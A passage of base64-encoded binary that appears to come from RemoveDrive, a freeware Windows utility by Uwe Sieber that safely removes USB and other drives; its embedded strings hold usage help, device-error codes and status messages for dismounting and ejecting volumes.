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AQAAV41F0FBoBIAAAGgZAgAAaP//AAD/FTCyQACLRRCLTfSJCDPAQF9eW8nCDABVi+yB7EAfAAChcClBAFNWV4lF6KFsKUEAvvjTQACNvaj+//9mpWgBAQAAiUX0M9uNhav+//9TUKToRYn//4PEDGgAAQAAjYWk/f//U1DHhaD9//9fOlwA6CaJ//+DxAxqM41FtVNQiF206BSJ//+DxAxoAwEAAI2Fmfz//1NQiJ2Y/P//6PmI//+KRQiDxAyIhaj+//+IhaD9//9oBAEAAI2FmPz//1CNhaj+//9Q/xVUsUAAajSNRbRQjYWg/f//UP8VXLFAAP91COhx/f//hcB0E2icxkAA6BWI//8zwFlA6bMCAABo0BsAAI2FxOD//1NQiV3wiZ3A4P//6IGI//+DxAw5HYApQQAPhMYAAADoOIH//2iI2kAA6NOH//+LNZSwQABZjUW0UI2FxOD//1D/1o2FmPz//1CNhQDj//9Q/9aNhaD9//9QjYVF7P//UP/WjYXA4P//UOh5df//aFyzQACJRfDohof//1k5HVgpQQB0YTld8HRciV38OR2oLkEAdFG+qC5BAIvGOV38iV3sfiWLffyLCIvWiX34OQp1B8dF7AEAAACBwiAFAAD/Tfh16jld7HUH/zDokfX///9F/ItF/GnAIAUAAI2AqC5BADkYdbaNhaj+//9QaKjaQADoC4f//1lZjUX4UFP/dQiJXfiJXfzodPz//4XAdAk5XfgPhMr+//+NRfhQ/3X0/3UI6Fj8//+FwA+EYwEAADld+HUnOV30dAdoeMhAAOsFaJzGQADot4b//zPAOV30D5XAQIlF/OlJAQAAOV3odRZotNpAAOiXhv//x0X8BAAAAOkuAQAAg334BnUMaLTaQADoe4b//+sO/3X4aMzaQADobIb//1lZOV3wdSM4nZj8//90G42FmPz//1CNhaj+//9QaODaQADoRYb//4PEDGgI20AA6DiG//9Zakb/FUSyQAAz/+t6aOgDAADopXv//4vwg/4bdHiKhaD9///o2vX//4XAdHCD/kZ1Dmg020AA6PyF//8z/1lHjUX4UFf/dQjoafv//4XAdFU5HYApQQB0D2iQKUEA6Kp5///obnj//zld+HQ+aFS0QADowYX//1lq9v8V4LBAAFD/FfSwQADos3z//4XAD4R5////60bomXz//+s/x0X8AwAAAOs2iV386zE7+3QHaHjIQADrBWicxkAA6HiF//8zwDv76b3+////FUCxQABQaETbQADoXoX//1lZi0X8X15bycIEAFWL7IPsDFNWM/ZXM9tW/xU4sUAAVlZqA1ZWaAAAAMBodNtAAP8VzLBAAIv4g///dSFqCv8VsLBAAP8VQLFAAD3nAAAAdQiLw0OD+GR8vzPA60JWjUX0UGoEjUX8UFeJdfjHRfz+/////xUwsUAAhcB0ElaNRfhQagSNRfxQV/8VZLBAAFf/FaSwQAAzwIN9+AQPlMBfXlvJw/90JAT/FbCwQAAzwEDCBABVi+yB7CgCAACDTfT/U1Yz9leLPcywQACJdfi7AAAAwFZWagNWVlNodNtAAP/XiUX8g/j/dSf/FUCxQAA95wAAAHUIahT/FbCwQACLRfj/RfiD+Ap8yjPA6SgBAACDTfD/Vo1N7FFqBI1N8FFQ/xUwsUAAhcB0F1aNRfhQagSNRfRQ/3X8iXX4/xVksEAA/3X8/xWksEAAg330/3S5ajL/FbCwQAD/dfSNhej+//9odNtAAGiM20AAUP8VXLJAAIPEEFZWagNWVlONhej+//9Q/9eJRfyD+P91Rv8VQLFAAIP4AnUjaPQBAAD/FbCwQABWVmoDVlZTjYXo/v//UP/XiUX8g/j/dRj/FUCxQABQaJTbQADokIP//1lZ6Tb///+LRQj/dQyJhdj9//+Nhdz9//9Q/xWUsEAAVo1F7FBoEAEAAI2F2P3//1D/dfz/FTCxQACL+Dv+dBtWjUUIUGgUAgAA/3UQiXUI/3X8/xVksEAAi/j/dfz/FaSwQAAzwIP/AQ+UwF9eW8nCDACDCP/DVYvsUVGLRgSD+P90I2oAjU34UWoEjU38UVDHRfz9/////xUwsUAA/3YE/xWksEAAycOB7BABAACDTgT/U4sdzLBAAFVXM/+JfCQMvQAAAMBXV2oDV1dVaHTbQAD/04lGBIP4/3UV/xVAsUAAPecAAAB1CGoU/xWwsEAAg34E/3UNi0QkDP9EJAyD+Ap8wotGBIP4/3UHM8DpwQAAAINMJBD/V41MJBhRagSNTCQcUVD/FTCxQACFwHQWV41EJBBQagRW/3YEiXwkIP8VZLBAAP92BP8VpLBAAIM+/3S4ajL/FbCwQAD/No1EJBxodNtAAGiM20AAUP8VXLJAAIPEEFdXagNXV1WNRCQwUP/TiUYEg/j/dUX/FUCxQACD+AJ1HGj0AQAA/xWwsEAAV1dqA1dXVY1EJDBQ/9OJRgSDfgT/dRj/FUCxQABQaJTbQADoxYH//1lZ6Tv///8zwEBfXVuBxBABAADDVYvsgew4AwAAVlcz/74QAQAAVo2F4P7//1dQiX38iX30iX346BiC//+LRQiJheD+//+LRQyDxAyJReg5fRB0EP91EI2F5P7//1D/FZSwQABXjUX0UFaNheD+//9Q/3ME/xUwsUAAhcB0cGgQAgAAjYXM/P//V1CJvcj8///ov4H//4PEDFeNRfhQvhQCAABWjYXI/P//UP9zBP8VZLBAAIXAdDY5fRR0Ef91FIvGjY3I/P//6LiB//9ZOb3I/P//dAnHRfwBAAAA6w//tcz8////FTixQACJffyLRfxfXsnCEADM/yXUsUAA/yXQsUAA/yXMsUAA/yXIsUAA/yXEsUAA/yXAsUAA/yW8sUAA/yW4sUAA/yW0sUAA/yWwsUAA/yWssUAA/yWosUAA/yUcskAA/yX0sUAA/yX4sUAA/yX8sUAA/yUAskAA/yUEskAA/yUIskAA/yUMskAA/yUQskAA/yUUskAA/yUYskAA/yUgskAA/yXwsUAA/yXssUAA/yWgsUAA/yVwskAA/yVoskAA/yVsskAA/yWEsEAA/yWIsEAA/yWMsEAA/yWQsEAA/yWUsEAA/yWYsEAA/yWcsEAA/yWgsEAA/yWksEAA/yWosEAA/yWssEAA/yWwsEAA/yW0sEAA/yW4sEAA/yW8sEAA/yXAsEAA/yXEsEAA/yXIsEAA/yXMsEAA/yXQsEAA/yXUsEAA/yXYsEAA/yXcsEAA/yXgsEAA/yXksEAA/yXosEAA/yXssEAA/yXwsEAA/yX0sEAA/yX4sEAA/yX8sEAA/yUAsUAA/yUEsUAA/yUIsUAA/yUMsUAA/yUQsUAA/yUUsUAA/yUYsUAA/yUcsUAA/yUgsUAA/yUksUAA/yUosUAA/yUssUAA/yUwsUAA/yU0sUAA/yVgsEAA/yU8sUAA/yVAsUAA/yVEsUAA/yVIsUAA/yVMsUAA/yVQsUAA/yVUsUAA/yVYsUAA/yVcsUAA/yVgsUAA/yVksUAA/yVosUAA/yVssUAA/yVwsUAA/yV0sUAA/yV4sUAA/yV8sUAA/yWAsUAA/yWEsUAA/yWIsUAA/yWMsUAA/yWQsUAA/yWUsUAA/yU4sUAA/yVwsEAA/yVssEAA/yVcsEAA/yUwsEAA/yU0sEAA/yU4sEAA/yU8sEAA/yVAsEAA/yVEsEAA/yVIsEAA/yVMsEAA/yVQsEAA/yVUsEAA/yVYsEAA/yWYsUAA/yWAsEAA/yV8sEAA/yV4sEAA/yV0sEAA/yVosEAA/yVksEAA/yVcskAA/yVYskAA/yVUskAA/yVQskAA/yVMskAA/yVIskAA/yVEskAA/yVAskAA/yU8skAA/yU4skAA/yVgskAA/yU0skAA/yUoskAA/yUsskAA/yUwskAA/yUAsEAA/yUosEAA/yUEsEAA/yUIsEAA/yUMsEAA/yUQsEAA/yUUsEAA/yUYsEAA/yUcsEAA/yUgsEAA/yUksEAA/yXksUAA/yXgsUAA/yXcsUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAITpAACw6QAAyOkAAN7pAAD46QAACuoAABrqAAAw6gAARuoAAFbqAACY6QAAAAAAABrnAAA25wAASOcAAFrnAABq5wAAgOcAAJLnAACe5wAAtOcAAMbnAADc5wAA/uYAANbkAABg6AAATOgAAODmAADM5gAAOugAACToAAAO6AAA+OcAAJDhAACk4QAAtuEAAMbhAADc4QAA6OEAAPbhAAAI4gAAHOIAACriAABA4gAAUOIAAFjiAABs4gAAeOIAAITiAACQ4gAAouIAALjiAADG4gAA1uIAAOLiAAD44gAAEOMAACDjAAAy4wAAUOMAAHDjAACE4wAAnuMAALLjAADG4wAA4OMAAPzjAAAS5AAAHuQAADzkAABS5AAAZOQAAHbkAACU5AAAouQAAK7kAAC65AAAxuQAALzmAADm5AAA/OQAAAzlAAAa5QAAJuUAADjlAABI5QAAWuUAAHDlAACU5QAApOUAALjlAADQ5QAA6OUAAADmAAAM5gAAKOYAADrmAABK5gAAZuYAAITmAACY5gAApOYAAOjnAAAAAAAAIOEAAAAAAAAO4AAA9t8AANbfAAC63wAAot8AAILfAABu3wAAXt8AADrfAAAW3wAA+N4AAODeAAAAAAAAhuoAAKgCAIB26gAAAAAAAP7gAADy4AAASuAAAFTgAABg4AAAdOAAAIrgAACi4AAAruAAALjgAADE4AAA0OAAAEDgAADc4AAAAAAAADzpAABS6QAAYukAAC7pAAAS6QAABOkAAPboAADi6AAA1OgAALjoAACm6AAAkugAAIboAAB66AAAIOkAAAAAAABc4QAAcuEAAELhAAAAAAAAAAAAAAAAAAAAAAAAConwVAAAAAACAAAATgAAAKTqAACk2gAAbnRkbGwuZGxsAAAATnRRdWVyeU9iamVjdAAAAE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbgAAAABHZXRGaWxlSW5mb3JtYXRpb25CeUhhbmRsZUV4AAAAACBhY2Nlc3MgZGVuaWVkAAAgZXJyPTB4JVgAAABod2luPSVwCgAAAAB2aXNpYmxlIFBJRFslaV09JXUKACB2aXNpYmxlCgAAAGV4ZT0lcyBmPSVzCgAAAAAgcHJjPSVzICBoPSVzCgAACgAAACAjIyMjIyBoYW5ncyAjIyMjIyMATgBhAG0AZQBkAFAAaQBwAGUAAABcAHcAaQBuAHMAbwBjAGsAAAAAAFNlRGVidWdQcml2aWxlZ2UAAAAAIHRpbWVvdXQgdGVzdGluZyBoYW5kbGVzIG9mICVzAAAgdGltZW91dAAAAAAweCVYICVzIDogJXMAAAAAJXMgOiAlcwAKJXMAIG5vbmUgZm91bmQAJXMqACVzJXMAAAAAbm8gcmVhZDogJXMAUHJlc3MgYW55IGtleSB0byBjbG9zZQAAJXMAACAJAABbUmVtb3ZlRHJpdmVdIAolNGk6ICVzCgAuAAAAYXJndlsldV09JyVzJwoAAC5kbXAAAAAAUmVtb3ZlRHJpdmUuZG1wAEV4Y2VwdGlvbiAweCUwOFggYXQgMHglcCEAAABEQkdIRUxQLkRMTAAKY2Fubm90IGxvYWQgZGJnaGVscC5kbGwgLT4gbm8gY3Jhc2hkdW1wCgAAAE1pbmlEdW1wV3JpdGVEdW1wAAAACmVycm9yOiBkYmdoZWxwLmRsbCB0b28gb2xkAE1pbmlEdW1wIHdyaXR0ZW4gdG8gJXMKcGxlYXNlIHNlbmQgaXQgdG8gbWFpbEB1d2Utc2llYmVyLmRlAHdyaXRpbmcgTWluaUR1bXAgZmFpbGVkIHdpdGggZXJyPTB4JVgAAABDUl9JTlZBTElEX1NUUlVDVFVSRV9TSVpFAAAAQ1JfSU5WQUxJRF9JTkRFWAAAAABDUl9JTlZBTElEX0NPTkZMSUNUX0xJU1QAAAAAQ1JfSU5WQUxJRF9SRUZFUkVOQ0VfU1RSSU5HAENSX05PX1NVQ0hfREVWSUNFX0lOVEVSRkFDRQBDUl9ERVZJQ0VfSU5URVJGQUNFX0FDVElWRQAAQ1JfSU5WQUxJRF9QUk9QRVJUWQBDUl9DQUxMX05PVF9JTVBMRU1FTlRFRABDUl9BQ0NFU1NfREVOSUVEAAAAAENSX05PX0NNX1NFUlZJQ0VTAAAAQ1JfTUFDSElORV9VTkFWQUlMQUJMRQAAQ1JfUkVNT1RFX0NPTU1fRkFJTFVSRQAAQ1JfSU5WQUxJRF9NQUNISU5FTkFNRQAAQ1JfTk9fU1VDSF9SRUdJU1RSWV9LRVkAQ1JfU0FNRV9SRVNPVVJDRVMAAABDUl9OT19ERVBFTkRFTlQAQ1JfQ0FOVF9TSEFSRV9JUlEAAABDUl9RVUVSWV9WRVRPRUQAQ1JfRlJFRV9SRVNPVVJDRVMAAABDUl9OT1RfRElTQUJMRUFCTEUAAENSX0lOVkFMSURfUFJJT1JJVFkAQ1JfV1JPTkdfVFlQRQAAAENSX05PX1NVQ0hfVkFMVUUAAAAAQ1JfREVWSUNFX05PVF9USEVSRQBDUl9OT19NT1JFX0hXX1BST0ZJTEVTAABDUl9ORUVEX1JFU1RBUlQAQ1JfREVWTE9BREVSX05PVF9SRUFEWQAAQ1JfSU5WQUxJRF9BUEkAAENSX0lOVkFMSURfREFUQQBDUl9JTlZBTElEX0RFVklDRV9JRAAAAABDUl9SRUdJU1RSWV9FUlJPUgAAAENSX05PX1JFR0lTVFJZX0hBTkRMRQAAAENSX05PX0FSQklUUkFUT1IAAAAAQ1JfQlVGRkVSX1NNQUxMAENSX0lOVkFMSURfTE9BRF9UWVBFAAAAAENSX0FQTV9WRVRPRUQAAABDUl9SRU1PVkVfVkVUT0VEAAAAAENSX05PVF9TWVNURU1fVk0AAAAAQ1JfQ1JFQVRFX0JMT0NLRUQAAABDUl9OT19TVUNIX0xPR0lDQUxfREVWAABDUl9GQUlMVVJFAABDUl9JTlZBTElEX1JBTkdFAAAAAENSX0lOVkFMSURfUkFOR0VfTElTVAAAAENSX0FMUkVBRFlfU1VDSF9ERVZOT0RFAENSX05PX01PUkVfUkVTX0RFUwAAQ1JfTk9fTU9SRV9MT0dfQ09ORgBDUl9OT19TVUNIX0RFVk5PREUAAENSX0RMVlhEX05PVF9GT1VORAAAQ1JfSU5WQUxJRF9SRVNPVVJDRUlEAAAAQ1JfREVWTk9ERV9IQVNfUkVRUwBDUl9JTlZBTElEX05PREVMSVNUAENSX0lOVkFMSURfQVJCSVRSQVRPUgAAAENSX0lOVkFMSURfTE9HX0NPTkYAQ1JfSU5WQUxJRF9SRVNfREVTAABDUl9JTlZBTElEX0RFVk5PREUAAENSX0lOVkFMSURfRkxBRwBDUl9JTlZBTElEX1BPSU5URVIAAENSX09VVF9PRl9NRU1PUlkAAAAAQ1JfREVGQVVMVAAAQ1JfU1VDQ0VTUwAAUkVTVU1FQVVUT01BVElDAE9FTUVWRU5UAAAAAFBPV0VSU1RBVFVTQ0hBTkdFAAAAQkFUVEVSWUxPVwAAUkVTVU1FU1RBTkRCWQAAAFJFU1VNRVNVU1BFTkQAAABSRVNVTUVDUklUSUNBTAAAU1RBTkRCWQBTVVNQRU5EAFFVRVJZU1RBTkRCWUZBSUxFRAAAUVVFUllTVVNQRU5ERkFJTEVEAABRVUVSWVNUQU5EQlkAAAAAUVVFUllTVVNQRU5EAAAAAFNFU1NJT05fUkVNT1RFX0NPTlRST0wAAFNFU1NJT05fVU5MT0NLAABTRVNTSU9OX0xPQ0sAAAAAU0VTU0lPTl9MT0dPRkYAAFNFU1NJT05fTE9HT04AAABSRU1PVEVfRElTQ09OTkVDVAAAAFJFTU9URV9DT05ORUNUAABDT05TT0xFX0RJU0NPTk5FQ1QAAENPTlNPTEVfQ09OTkVDVABOVUxMAAAAADB4JVgAAAAARE5fMHglWABQQlRfQVBNJXMAAABQQlRfMHglWAAAAABDUl8weCVYAElERVxDRFJPTQAAAElERVxESVNLAAAAAFVTQgBTQ1NJAAAAAFNCUDIAAAAAU1NBAEZJQgBSQUlEAAAAAENEUk9NAAAARElTSwAAAABGTE9QUFkAAENEcml2ZUluZm86OkNyZWF0ZVNuYXBzaG90IFN0YXJ0ICBEcml2ZVR5cGU9JXMAACVzXABQaHlzaWNhbERyaXZlJXUAQ2RSb20ldQBGbG9wcHkldQAAAABDRHJpdmVJbmZvOjpDcmVhdGVTbmFwc2hvdCBGaW5pc2ggIERyaXZlQ291bnQ9JWkAAAAAB2P1U7+20BGU8gCgyR77iwhj9VO/ttARlPIAoMke+4sRY/VTv7bQEZTyAKDJHvuLUmVtb3ZlRHJpdmUgViV1LiV1LiV1ICglcykgLSBwcmVwYXJlcyBkcml2ZXMgZm9yIHNhZmUgcmVtb3ZhbAoAAEZyZWV3YXJlIGJ5IFV3ZSBTaWViZXIgLSB3d3cudXdlLXNpZWJlci5kZQoAVXNhZ2U6CgBSZW1vdmVEcml2ZSBEcml2ZVNwZWM6IFstdl1bLWRdWy1sXVstaF1bLWFdWy1iXVstdF1bLWZdWy1pXVstc11bLWRiZ11bLXc6bm5ubl0KAERyaXZlU3BlYzogaXMgdGhlIGRyaXZlIHRvIHJlbW92ZSwgZS5nLiBVOiBvciAuIGZvciB0aGUgY3VycmVudCBkcml2ZQoAAFstNDddICAgICBwZXJmb3JtIHNhZmUgcmVtb3ZhbCByZXN1bHRpbmcgaW4gcHJvYmxlbSBjb2RlIDQ3CgAAAABbLXZdICAgICAgcmVtb3ZlIHRoZSB2b2x1bWUgb25seSBpbnN0ZWFkIG9mIHRoZSBkcml2ZSBvciB3aG9sZSBkZXZpY2UKAABbLWRdICAgICAgcmVtb3ZlIHRoZSBkcml2ZSBvbmx5IGluc3RlYWQgb2YgdGhlIHdob2xlIGRldmljZQoAAAAAWy1sXSAgICAgIGxvb3AgdW50aWwgc3VjY2VzcwoAAABbLWhdICAgICAgc2hvdyBvcGVuIGhhbmRsZXMgKGFkbWluIHJpZ2h0cyByZXF1aXJlZCwgZXhwcmltZW50YWwsIG1heSBmcmVlemUhKQoAAFstaFhdICAgICBzaG93IG9wZW4gaGFuZGxlcyBvbiBkcml2ZSBYOgoAAAAAWy1hXSAgICAgIGFjdGl2YXRlIHdpbmRvd3Mgb2YgYXBwbGljYXRpb25zIHdpdGggb3BlbiBoYW5kbGVzCgAAAFstdzpubm5uXSB3YWl0IG5ubm4gbWlsbGlzZWNvbmRzIGJlZm9yZSBjbG9zZQoAAFstc10gICAgICBzZWxmIGRlbGV0ZSByZW1vdmVkcml2ZS5leGUKAAAAAAAAWy1iXSAgICAgIGxldCBXaW5kb3dzIHNob3cgdGhlICJpdCdzIHNhZmUgbm93IiBiYWxsb29uIHRpcCAoWFAgb25seSkKAAAAWy1lXSAgICAgIHRyeSBkaXNtb3VudCBhbmQgZWplY3QgaWYgdGhlIHNhZmUgcmVtb3ZhbCBmYWlscwoAAAAAAFstdF0gICAgICByZWxlYXNlIFRydWVDcnlwdCB2b2x1bWVzIGhvc3RlZCBieSB0aGUgZHJpdmUgdG8gcmVtb3ZlCgAAWy1mXSAgICAgIGZvcmNlIGRpc21vdW50L2VqZWN0L3RydWVjcnlwdCByZWxlYXNlCgAAAFstaV0gICAgICBzdG9wIFdpbmRvd3MgaW5kZXhpbmcgc2VydmljZSAoQ2lTdmMpIGZvciBhIG1vbWVudCBpZiByZXF1aXJlZCAoYWRtaW5zKQoAAFstZGJnXSAgICBzaG93IGRlYnVnIGluZm9ybWF0aW9uCgAAAApvcgoKAAAAUmVtb3ZlRHJpdmUgQW55SWRTdHJpbmcgWy1sXSBbZXRjXQoAAAAAAEFueUlkU3RyaW5nIGlzIGFueSBJRCBzdHJpbmcgb2YgdGhlIGRldmljZSBlLmcuICJDb3JzYWlyIEZsYXNoIFZveWFnZXIiCgAAAAAAAAAAYXMgc2hvd24gaW4gdGhlICdzYWZlIHJlbW92YWwnIGRpYWxvZyB3aGVuICdzaG93IGNvbXBvbmVudHMnIGlzIGNoZWNrZWQKAAAAAG9yIHRoZSBkZXZpY2UgaWQgc3RyaW5nIG9mIHRoZSB2b2x1bWUgb3Igb2YgdGhlIGRpc2sKAAAALmluaQAAAABcXD9cVm9sdW1lewBpbnZhbGlkIGRyaXZlICVzIC0gYWJvcnQKCgAAdm9sdW1lPSVzCgAASW52YWxpZCBkcml2ZSAtPiBhYm9ydAoKAAAAAGNkcm9tAAAAXERldmljZVxDZFJvbSV1AFxEZXZpY2VcSGFyZGRpc2sldVxQYXJ0aXRpb24ldQAAXERldmljZVxIYXJkZGlzayV1XFBhcnRpdGlvbgAAAAAAAAAAUmVtb3ZlRHJpdmUuZXhlIGlzIG9uIGEgVHJ1ZUNyeXB0IHZvbHVtZSBob3N0ZWQgYnkgdGhlIGRyaXZlIHRvIHJlbW92ZSAtPiBleGVjdXRlIHRlbXBvcmFyeSBjb3B5IGFuZCBleGl0CgoAUmVtb3ZpbmcgJXMgdm9sdW1lICVjOiAoJXMpCgAAAABhYm9ydAoAAFRFTVAgcGF0aCAoJXMpIGlzIG9uIHRoZSBkcml2ZSB0byByZW1vdmUgLT4gYWJvcnQKAAAlcyVzJXMAAENvcHlGaWxlKCclcycsICclcycpICByZXM9JWkKAAAACmVycj0lcwoAAAAAAAAAAFJlbW92ZURyaXZlLmV4ZSBpcyBvbiB0aGUgZHJpdmUgdG8gcmVtb3ZlIC0+IGV4ZWN1dGUgdGVtcG9yYXJ5IGNvcHkgYW5kIGV4aXQKCgAAIgAAACIgAAAiLXMiAAAAACJcIgAiLiIAZXhlY3V0aW5nPSVzICVzCgAAAABvcGVuAAAAAFJlbW92aW5nIFZvbHVtZSAlcwAAUmVtb3ZpbmcgRHJpdmUgJyVzJyAoJXMpAAAAAFJlbW92aW5nICclcycgKCVzKQAAUmVtb3ZpbmcgRHJpdmUgJXMAAABSZW1vdmluZyAnJXMnIAAAUmVtb3ZpbmcgRHJpdmUgACgAAAAsIAAAKQAAAFJlbW92aW5nIERldmljZSAnJXMnAAAAAHZvbHVtZSBpcyBub3QgbW91bnRlZAAAAApjaGVja2luZyBmb3Igb3BlbiBoYW5kbGVzIG9uICVzLi4uAFg6XABYOgAAXFwuXFg6AABjaGVja2luZyBmb3Igb3BlbiBoYW5kbGVzIG9uICVzLi4uAAANAAAAc3VjY2VzcwAKdm9sdW1lIGlzIGxvY2F0ZWQgb24gJXUgZGlza3MsIHRyeSB0byByZW1vdmUuLi4KAAAARGlzayV1Li4uAAAAIHN1Y2Nlc3MAAAAAIGZhaWxlZABlamVjdCBzdWNjZXNzAAAAbm8gcmVzcG9uc2UgYnV0IAAAAABkZXZpY2UgaGFzIGJlZW4gcmVtb3ZlZABjYW5jZWxlZAAAAABmYWlsZWQAAG5vIHJlc3BvbnNlAHJlc3RhcnRpbmcgaW5kZXhpbmcgc2VydmljZS4uAAAAQ2lTdmMAAAAgT0sKAAAAACBmYWlsZWQKAAAAAGV4aXQgd2l0aCBlcnJsPSV1CgAAaGlkaW5nIHRoZSBjb25zb2xlIHdpbmRvdy4uLgAAAABGQVIuZXhlAGNtZC5leGUAcHNhcGkuZGxsAAAAR2V0UHJvY2Vzc0ltYWdlRmlsZU5hbWVBAAAAAFMtMS01LTE4AAAAAFMtMS01LQAAUHJvY2VzcyV1AAAAU2tpcFByb2Nlc3NIYW5kbGVzAAAgb3BlbiB2b2x1bWUgZmFpbGVkICBlcnI9JXMKAAAAAEZsdXNoaW5nIGNhY2hlLi4uAAAAIGZhaWxlZCAgZXJyPSVzCgAAAABMb2NraW5nIHZvbHVtZS4uLgAAACBPSwBEaXNtb3VudGluZyB2b2x1bWUuLi4AAABUYWtpbmcgb2ZmbGluZS4uLgAAAFRha2luZyBvbmxpbmUuLi4AAAAAIG9wZW4gZHJpdmUgZmFpbGVkICBlcnI9JXMKAEVqZWN0aW5nIG1lZGlhLi4uAAAAcmVtb3ZhbCBmYWlsZWQKAFByZXNzIEVzYyB0byBjYW5jZWwsIEQgdG8gZGlzbW91bnQuIFRyeWluZy4uAAAAAApkaXNtb3VudGluZyB2b2x1bWUuLi4KACBPSyAoYnkgZm9yY2UpCgAKUmVtb3ZlRGV2aWNlKCclcycsICV1KQAKUmVtb3ZlRGV2aWNlKCcldScsICV1KQAKRGV2aWNlIHRvIHJlbW92ZSBpcyAldQogIElEPSVzCgAAAABGb3VuZCByZW1vdmFibGUgcGFyZW50IERldmljZSB0byByZW1vdmUgJXUKICBJRD0lcwoACnN0b3BwaW5nIGluZGV4aW5nIHNlcnZpY2UuLi4AAAAgT0sKdHJ5IGFnYWluLi4uAAAAAGxvb2sgZm9yIG9wZW4gaGFuZGxlcyBvbiBkaXNrICclcycgb3IgJyVzJwAAbG9vayBmb3Igb3BlbiBmaWxlcyBvbiB2b2x1bWUgJyVzJyBvciAnJXMnAABsb29rIGZvciBvcGVuIGZpbGVzIG9uIHZvbHVtZSAnJXMnAAAKVmV0bz0lcwAAAAByZW1vdmFsIGZhaWxlZCwgdHJ5IHRvIGxvY2sgYW5kIGVqZWN0Li4uCgAAAG9uZSBsYXN0IHRyeSB0byBzYWZlbHkgcmVtb3ZlIHRoZSBkZXZpY2UuLgAAIGZhaWxlZCwgZWplY3QgbXVzdCBiZSBnb29kIGVub3VnaAoAUHJlc3MgRXNjIHRvIGNhbmNlbCBvciBFIHRvIGVqZWN0IG1lZGlhLiBUcnlpbmcuLgAAAAplamVjdGluZyBtZWRpYS4uLgoACnJlbW92ZWQgZGV2PSVzAApQcm9ibGVtTnVtYmVyKCV1KT0ldQAAAApjcmV0PSVzIFByb2JsZW1OdW1iZXIoJXUpPSV1AAAACkRldmljZSBzYWZlbHkgcmVtb3ZlZCBidXQgd2FzIHJlZGV0ZWN0ZWQgaW1tZWRpYXRlbHkKAAAAAAAAQ01fUmVxdWVzdF9EZXZpY2VfRWplY3QoJXUpIGNyZXQ9JXMgdm